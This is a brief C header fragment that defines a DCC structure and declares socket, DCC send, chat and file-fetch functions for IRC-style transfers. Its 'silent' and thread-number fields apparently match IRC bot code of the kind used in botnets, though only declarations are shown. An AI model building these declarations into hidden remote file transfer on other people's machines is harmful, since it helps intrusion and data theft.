typedef struct DCC {
	char host[20];
	char filename[MAX_PATH];
	char sendto[50];
	int port;
	int threadnum;
	SOCKET dcchost;
	SOCKET sock;
	BOOL notice;
	BOOL silent;
	BOOL info;
} DCC;

SOCKET create_sock(char *host, int port);
DWORD WINAPI dcc_send(LPVOID param);
DWORD WINAPI dcc_chat(LPVOID param);
DWORD WINAPI dcc_getfile(LPVOID param);
